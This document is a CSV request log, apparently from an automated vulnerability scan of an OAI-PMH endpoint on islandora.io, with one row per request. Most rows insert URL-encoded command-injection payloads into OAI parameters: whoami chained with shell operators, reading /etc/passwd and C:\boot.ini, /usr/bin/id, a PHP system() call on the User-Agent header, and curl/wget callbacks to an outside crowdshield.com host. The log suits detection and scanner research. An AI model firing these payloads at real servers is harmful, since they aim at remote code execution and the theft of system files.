uuid,timestamp,http_status_code,request_url,response_time,http_version
eed1a421-ddb4-47a7-a11f-b44d674e2e12,2025-01-28 08:17:45,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22+%26%26+whoami&until=%22+%26%26+whoami,65.92 ms,HTTP/1.1
1bb7ccad-5aa8-4999-98fc-6218687fec30,2025-01-28 08:17:45,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%26%26+whoami&metadataPrefix=marc,40.60 ms,HTTP/1.1
da43acd8-e1f4-44cc-96af-4faad7ab91c0,2025-01-28 08:17:46,200,http://islandora.io/oai/request?verb=%22+whoami,50.12 ms,HTTP/1.1
c0005663-3f85-4074-be6c-f350ca6b31ce,2025-01-28 08:17:46,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22+whoami,57.37 ms,HTTP/1.1
35364038-e158-416a-a9be-cbb582d1d424,2025-01-28 08:17:46,200,http://islandora.io/oai/request?verb=ListSets,39.14 ms,HTTP/1.1
99b08460-4f18-4c73-bf24-7e762abc72d5,2025-01-28 08:17:47,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22+whoami&until=%22+whoami,41.30 ms,HTTP/1.1
951c2593-8c94-4a1b-a67f-a67d9ce6b800,2025-01-28 08:17:47,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%22+whoami&set=%22+whoami,37.14 ms,HTTP/1.1
6c01352e-892d-4e13-918c-3a4c8939739e,2025-01-28 08:17:47,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+whoami&metadataPrefix=oai_dc,57.53 ms,HTTP/1.1
57044920-02ab-43dc-ba54-7c5247412b6d,2025-01-28 08:17:48,200,http://islandora.io/oai/request?verb=%22+%7C+whoami,51.15 ms,HTTP/1.1
247e40f0-5ca6-4800-88c8-21bb8813e3f4,2025-01-28 08:17:48,200,http://islandora.io/oai/request?verb=ListMetadataFormats,56.42 ms,HTTP/1.1
1695240d-b9c4-458d-9eaf-81de14e02bc9,2025-01-28 08:17:49,200,http://islandora.io/oai/request?verb=ListSets,35.64 ms,HTTP/1.1
a182aa37-8ea8-45aa-a1fa-86f09b9d4b82,2025-01-28 08:17:49,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%22+%7C+whoami,64.65 ms,HTTP/1.1
3e1aa533-8142-4caa-b368-be166a7b061e,2025-01-28 08:17:49,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%22+%7C+whoami,66.47 ms,HTTP/1.1
98bbe786-31d2-4c88-9323-22220e451847,2025-01-28 08:17:50,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%7C+whoami&metadataPrefix=marc,56.09 ms,HTTP/1.1
1c2aa683-85e5-423e-802e-cc913b0296f3,2025-01-28 08:17:50,200,http://islandora.io/oai/request?verb=%22+%7C%7C+whoami,34.63 ms,HTTP/1.1
03877de5-3f17-465d-bbc7-60fc3b8113e4,2025-01-28 08:17:50,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22+%7C%7C+whoami,57.90 ms,HTTP/1.1
7ff9983c-fcad-43b2-b0a3-1efaa3eb6fea,2025-01-28 08:17:51,200,http://islandora.io/oai/request?verb=ListSets,37.71 ms,HTTP/1.1
2b9c0ece-5020-4701-9e11-609df2963c86,2025-01-28 08:17:51,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%22+%7C%7C+whoami,37.89 ms,HTTP/1.1
8d82fe93-5972-43f7-a42e-1c78b4a1886d,2025-01-28 08:17:52,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,44.17 ms,HTTP/1.1
68584380-8ca5-4c30-9da0-4515ef9e1b38,2025-01-28 08:17:52,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%7C%7C+whoami&metadataPrefix=marc,63.67 ms,HTTP/1.1
1b1f35bd-ce8d-40fb-b287-1da57a011c8c,2025-01-28 08:17:52,200,http://islandora.io/oai/request?verb=%22%27,51.98 ms,HTTP/1.1
8e32726a-3b34-47fe-8a01-c743c1077eef,2025-01-28 08:17:53,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22%27,32.15 ms,HTTP/1.1
6dbf6624-efd9-4813-9aa9-13a2bbfa464c,2025-01-28 08:17:53,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%22%27,56.08 ms,HTTP/1.1
b81112e7-59c8-4e5b-8ec3-efa16cfeac2d,2025-01-28 08:17:53,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%27&until=%22%27,53.64 ms,HTTP/1.1
ece6f902-e34c-4e5f-9bd1-205b800b0af4,2025-01-28 08:17:54,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22%27&until=%22%27,53.95 ms,HTTP/1.1
1da7790b-d866-4902-adbe-c7ae48cc4a8b,2025-01-28 08:17:54,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22%27&metadataPrefix=marc,56.78 ms,HTTP/1.1
2f1ade5b-1f66-47b1-9cde-3231b75b0c9f,2025-01-28 08:17:54,200,http://islandora.io/oai/request?verb=%22%3B+whoami,76.49 ms,HTTP/1.1
fe26e894-f423-41ca-97a0-3c16ce659525,2025-01-28 08:17:55,200,http://islandora.io/oai/request?verb=ListMetadataFormats,42.90 ms,HTTP/1.1
2dad5f66-c7bb-4332-adfd-b0f830e42dc2,2025-01-28 08:17:55,200,http://islandora.io/oai/request?verb=ListSets,53.99 ms,HTTP/1.1
e136689a-1211-4e1f-af8b-73654fa2886b,2025-01-28 08:17:55,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%22%3B+whoami,61.15 ms,HTTP/1.1
b6754d87-5930-4ca2-a188-213163b74ef8,2025-01-28 08:17:56,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%22%3B+whoami&set=%22%3B+whoami,38.04 ms,HTTP/1.1
c67c4209-b2c9-47a1-b968-1b8c2a45f0fb,2025-01-28 08:17:56,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22%3B+whoami&metadataPrefix=marc,62.04 ms,HTTP/1.1
ceb64705-2d39-4e79-9aa8-928e53321764,2025-01-28 08:17:56,200,http://islandora.io/oai/request?verb=%24%28%60cat+%2Fetc%2Fpasswd%60%29,68.40 ms,HTTP/1.1
0b5d52b6-74c7-44bd-bd3d-bfc5c2152a26,2025-01-28 08:17:57,200,http://islandora.io/oai/request?verb=ListMetadataFormats,47.54 ms,HTTP/1.1
7697fd6f-62c5-4e04-9cad-ae0644855c3e,2025-01-28 08:17:57,200,http://islandora.io/oai/request?verb=ListSets,34.16 ms,HTTP/1.1
7e12b396-a010-4429-beba-c366b33674b8,2025-01-28 08:17:57,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60cat+%2Fetc%2Fpasswd%60%29&until=%24%28%60cat+%2Fetc%2Fpasswd%60%29,74.75 ms,HTTP/1.1
b734649c-9c8f-46f5-8fad-178f0e8f5c99,2025-01-28 08:17:58,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%28%60cat+%2Fetc%2Fpasswd%60%29,61.68 ms,HTTP/1.1
c7cb8eb8-dfe2-44ad-88b1-53f27e4e3abd,2025-01-28 08:17:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60cat+%2Fetc%2Fpasswd%60%29&metadataPrefix=oai_dc,57.67 ms,HTTP/1.1
b8c3bd06-b74e-47d5-87da-40c5324f20ae,2025-01-28 08:17:59,200,http://islandora.io/oai/request?verb=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,53.42 ms,HTTP/1.1
4b65b7a5-04d2-48f0-ac00-0914851515a5,2025-01-28 08:17:59,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,55.14 ms,HTTP/1.1
76173153-74c7-471f-b820-ca5726c5a8ad,2025-01-28 08:17:59,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,50.90 ms,HTTP/1.1
6f050484-4bfb-4555-85d8-4b0b0e169246,2025-01-28 08:18:00,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,69.56 ms,HTTP/1.1
594d7849-e2f9-40ec-b53c-a7248a07da16,2025-01-28 08:18:00,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,62.93 ms,HTTP/1.1
6d70804e-7433-4366-830d-767839afe10d,2025-01-28 08:18:00,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=marc,64.31 ms,HTTP/1.1
0016509e-6829-4bdc-8ac1-2509c63c27df,2025-01-28 08:18:01,200,http://islandora.io/oai/request?verb=%24%28%60dir%60%29,65.31 ms,HTTP/1.1
bb0bfe28-90be-4da8-84b7-594d5d7cd9a7,2025-01-28 08:18:01,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.46 ms,HTTP/1.1
e62401a5-ac74-4d46-9b39-e2c87df92c04,2025-01-28 08:18:01,200,http://islandora.io/oai/request?verb=ListSets,43.02 ms,HTTP/1.1
689ccbde-fdec-44e0-8d14-4bca93a1f089,2025-01-28 08:18:02,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60dir%60%29&until=%24%28%60dir%60%29,74.76 ms,HTTP/1.1
0edbef8f-fdb0-4f47-b3ea-891d3011107d,2025-01-28 08:18:02,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60dir%60%29&set=%24%28%60dir%60%29,49.65 ms,HTTP/1.1
b35ff48e-ae5e-477b-9529-63dc03f1dc41,2025-01-28 08:18:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60dir%60%29&metadataPrefix=oai_dc,69.54 ms,HTTP/1.1
ba3b812c-d4ed-4541-a17b-ec177f31446e,2025-01-28 08:18:03,200,http://islandora.io/oai/request?verb=%24%28%60ls%60%29,69.36 ms,HTTP/1.1
1f11ff61-ea73-4140-8bf2-7ce11bf2075e,2025-01-28 08:18:03,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60ls%60%29,50.42 ms,HTTP/1.1
76e3300a-39df-4fa4-b92e-386f3d36be17,2025-01-28 08:18:04,200,http://islandora.io/oai/request?verb=ListSets,45.95 ms,HTTP/1.1
0e036d72-a029-4965-8c63-2d9ea0169ca1,2025-01-28 08:18:04,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,78.02 ms,HTTP/1.1
29458440-b544-4317-a32c-35c84bb19450,2025-01-28 08:18:04,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%24%28%60ls%60%29,53.88 ms,HTTP/1.1
82f3a697-024c-481f-a969-b19bb8c22ebb,2025-01-28 08:18:05,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60ls%60%29&metadataPrefix=marc,60.15 ms,HTTP/1.1
0f446ff7-8d63-483a-aa88-57d95e37e4e9,2025-01-28 08:18:05,200,http://islandora.io/oai/request?verb=%24%28%60type+C%3A%5Cboot.ini%60%29,35.66 ms,HTTP/1.1
f8e7ffc6-4c80-4596-abe8-a3c2bdc18f22,2025-01-28 08:18:05,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29,56.34 ms,HTTP/1.1
3c6a5cdc-6814-422c-a237-deb3ee4a6730,2025-01-28 08:18:06,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60type+C%3A%5Cboot.ini%60%29,56.76 ms,HTTP/1.1
b8779f5a-099b-40cb-9f30-7a65d63e7d69,2025-01-28 08:18:06,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60type+C%3A%5Cboot.ini%60%29&set=%24%28%60type+C%3A%5Cboot.ini%60%29,60.88 ms,HTTP/1.1
3bef129a-1caa-4afe-8abc-9bf03992ffe6,2025-01-28 08:18:07,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%28%60type+C%3A%5Cboot.ini%60%29&set=%24%28%60type+C%3A%5Cboot.ini%60%29,54.50 ms,HTTP/1.1
f55c18b7-f60b-41c0-ba02-9e49b0168d33,2025-01-28 08:18:07,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29&metadataPrefix=marc,48.62 ms,HTTP/1.1
abe2e6f8-05c5-489e-be78-065b86b31a65,2025-01-28 08:18:07,200,http://islandora.io/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,63.08 ms,HTTP/1.1
71e68f98-5c3b-4401-b9f2-aa5fb78ad3c1,2025-01-28 08:18:08,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,59.99 ms,HTTP/1.1
7ed314f2-3b2d-45e7-aad3-607579521573,2025-01-28 08:18:08,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,52.64 ms,HTTP/1.1
cdd85f0b-9c71-42ba-970a-bc8a2f02e181,2025-01-28 08:18:08,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,51.38 ms,HTTP/1.1
7b5fc13f-6e33-4c40-bbdd-1ab9ff7054a2,2025-01-28 08:18:09,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,141.61 ms,HTTP/1.1
f676bd5b-56f8-478d-9455-ed94d109dfd2,2025-01-28 08:18:09,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=marc,64.17 ms,HTTP/1.1
8d50a8cf-ced6-4a0b-b9c1-3aa006b62a6b,2025-01-28 08:18:09,200,http://islandora.io/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,49.28 ms,HTTP/1.1
84fd7ca4-565d-402c-8e08-9427f497386c,2025-01-28 08:18:10,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.07 ms,HTTP/1.1
23d02754-8931-4840-892b-c63f8b0ca135,2025-01-28 08:18:10,200,http://islandora.io/oai/request?verb=ListSets,46.81 ms,HTTP/1.1
45f00192-8221-4a99-9ed7-30bdd7fd508f,2025-01-28 08:18:11,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,73.51 ms,HTTP/1.1
47aa6043-7a17-46a0-b6c9-30011a1f6d13,2025-01-28 08:18:11,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,60.85 ms,HTTP/1.1
4d7be4cb-a2d5-4c1b-9c71-12e4fbea7cb4,2025-01-28 08:18:11,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&metadataPrefix=marc,67.71 ms,HTTP/1.1
c9c20f03-5968-4fbd-8e25-787245cf5b4a,2025-01-28 08:18:12,200,http://islandora.io/oai/request?verb=%24%28%60whoami%60%29,43.86 ms,HTTP/1.1
158ba4e0-f5e5-4da9-ab23-8b24be08ee66,2025-01-28 08:18:12,200,http://islandora.io/oai/request?verb=ListMetadataFormats,55.23 ms,HTTP/1.1
61f915fa-3342-4fa4-ad7f-d651c1cbcc58,2025-01-28 08:18:12,200,http://islandora.io/oai/request?verb=ListSets,50.05 ms,HTTP/1.1
37d78dd4-ed5f-4abc-b79c-3b6e97cfe183,2025-01-28 08:18:13,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60whoami%60%29,47.70 ms,HTTP/1.1
197e263c-c30d-4d29-ad8f-5982c4db7e52,2025-01-28 08:18:13,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,109.93 ms,HTTP/1.1
0d35c833-6f2d-4bdb-be72-dde7ecf148fb,2025-01-28 08:18:13,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60whoami%60%29&metadataPrefix=oai_dc,56.63 ms,HTTP/1.1
2937fb25-9d8c-4b12-961a-fd0f13c7bc24,2025-01-28 08:18:14,200,http://islandora.io/oai/request?verb=%24%3B%2Fusr%2Fbin%2Fid,80.39 ms,HTTP/1.1
39ae53c3-de9d-4947-bd74-ea70a07fd2ef,2025-01-28 08:18:14,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%3B%2Fusr%2Fbin%2Fid,67.07 ms,HTTP/1.1
fac85788-4fb8-4f17-a139-c42d0d0f1bc3,2025-01-28 08:18:14,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%3B%2Fusr%2Fbin%2Fid,61.83 ms,HTTP/1.1
ddf9b35e-6be0-4584-88be-7ef1b5d93bc1,2025-01-28 08:18:15,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%24%3B%2Fusr%2Fbin%2Fid,66.59 ms,HTTP/1.1
7757275e-c169-42b0-9c18-c9bb2eb9a972,2025-01-28 08:18:15,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%3B%2Fusr%2Fbin%2Fid&set=%24%3B%2Fusr%2Fbin%2Fid,66.34 ms,HTTP/1.1
87593257-9bac-4850-81cf-a98fafe268a2,2025-01-28 08:18:15,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%3B%2Fusr%2Fbin%2Fid&metadataPrefix=oai_dc,59.15 ms,HTTP/1.1
a5cdaf4d-2e67-4fe3-9f68-119b39d393e7,2025-01-28 08:18:16,200,http://islandora.io/oai/request?verb=%24%7B%40print%28%22RCEVulnerable%22%29%7D,99.22 ms,HTTP/1.1
b47d9608-93f0-4c99-8d2d-d552501724c9,2025-01-28 08:18:16,200,http://islandora.io/oai/request?verb=ListMetadataFormats,58.79 ms,HTTP/1.1
f4ab80d1-e717-4ed7-95d4-dbc7ac33b347,2025-01-28 08:18:17,200,http://islandora.io/oai/request?verb=ListSets,45.39 ms,HTTP/1.1
f4388497-258d-4f07-b492-e442a5d072fe,2025-01-28 08:18:17,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%7B%40print%28%22RCEVulnerable%22%29%7D,67.17 ms,HTTP/1.1
c4a33db7-f7ce-4486-822e-5e9cecd30f55,2025-01-28 08:18:17,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%7B%40print%28%22RCEVulnerable%22%29%7D&until=%24%7B%40print%28%22RCEVulnerable%22%29%7D,56.62 ms,HTTP/1.1
239d530d-64ec-4150-ab4e-76fd8abdd0e2,2025-01-28 08:18:18,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%7B%40print%28%22RCEVulnerable%22%29%7D&metadataPrefix=marc,51.80 ms,HTTP/1.1
ed202709-32b9-4472-9104-42d56ea443df,2025-01-28 08:18:18,200,http://islandora.io/oai/request?verb=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,58.98 ms,HTTP/1.1
83acb50c-113f-4f8b-a2d0-48df34245fb2,2025-01-28 08:18:18,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,67.88 ms,HTTP/1.1
d791896a-d14a-4850-a0f3-4d39e839137d,2025-01-28 08:18:19,200,http://islandora.io/oai/request?verb=ListSets,53.73 ms,HTTP/1.1
b769c5a8-1a12-4f2f-9e90-837213a684ab,2025-01-28 08:18:19,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D&until=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,65.45 ms,HTTP/1.1
ee294d52-ec36-4161-9e49-ba090a2a0c91,2025-01-28 08:18:19,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D&until=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,71.73 ms,HTTP/1.1
2d0319bb-c918-4403-8166-34764eeb3c2b,2025-01-28 08:18:20,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D&metadataPrefix=marc,53.26 ms,HTTP/1.1
bfdaecc1-0e06-41ab-8a8e-9a8293d2f9fa,2025-01-28 08:18:20,200,http://islandora.io/oai/request?verb=%250A%2Fusr%2Fbin%2Fid,67.59 ms,HTTP/1.1
d6519e89-8f61-4fe4-95ae-d4e635df13b0,2025-01-28 08:18:20,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.88 ms,HTTP/1.1
b4268d44-8dd9-46b1-8886-69ea842557d0,2025-01-28 08:18:21,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250A%2Fusr%2Fbin%2Fid,78.86 ms,HTTP/1.1
c0a9b786-08ae-460b-afe8-7acdb5de65b2,2025-01-28 08:18:21,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%250A%2Fusr%2Fbin%2Fid&set=%250A%2Fusr%2Fbin%2Fid,64.72 ms,HTTP/1.1
d1162135-5216-4360-b511-375e32d85c68,2025-01-28 08:18:21,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%250A%2Fusr%2Fbin%2Fid&set=%250A%2Fusr%2Fbin%2Fid,57.41 ms,HTTP/1.1
782c7538-bf8c-4384-b911-0a4de4c411e5,2025-01-28 08:18:22,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid&metadataPrefix=marc,66.24 ms,HTTP/1.1
59282859-98c4-4128-859a-9d833d488ef5,2025-01-28 08:18:22,200,http://islandora.io/oai/request?verb=%250A%2Fusr%2Fbin%2Fid%250A,68.54 ms,HTTP/1.1
e3b38298-e666-4e8b-ae7d-78202dde67ab,2025-01-28 08:18:23,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%250A%2Fusr%2Fbin%2Fid%250A,53.26 ms,HTTP/1.1
9897d1c9-4b1d-4e09-a155-be28c41eccb7,2025-01-28 08:18:23,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%250A%2Fusr%2Fbin%2Fid%250A,61.42 ms,HTTP/1.1
